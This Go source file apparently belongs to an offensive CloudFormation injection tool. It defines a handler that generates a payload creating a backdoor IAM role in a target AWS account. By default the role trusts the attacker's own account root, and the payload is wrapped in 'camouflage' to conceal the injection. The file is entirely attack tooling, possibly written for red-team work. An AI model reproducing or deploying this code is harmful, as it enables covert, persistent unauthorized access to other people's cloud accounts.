package cfni

import "fmt"

type CreateIAMRoleBackdoorOptions struct {
	Principal   string
	LogicalID   string
	RoleName    string
	S3AccessKey *S3AccessKey
}

func (c *CFNI) CreateIAMRoleBackdoorHandler(opts *CreateIAMRoleBackdoorOptions) ([]byte, error) {
	type data struct {
		Principal string
		LogicalID string
		RoleName  string
	}

	if opts.Principal == "" {
		opts.Principal = fmt.Sprintf("arn:aws:iam::%s:root", c.attackerAccount)
	}

	cfni, err := executeTemplate("templates/iam_role_backdoor.py", &data{
		Principal: opts.Principal,
		LogicalID: opts.LogicalID,
		RoleName:  opts.RoleName,
	})
	if err != nil {
		return nil, err
	}

	camouflage, err := c.createCamouflage()
	if err != nil {
		return nil, err
	}

	return c.createHandler(&HandlerTemplateProperties{
		CFNI:       cfni.String(),
		Camouflage: camouflage,
		S3Client:   s3Client(opts.S3AccessKey),
	})
}
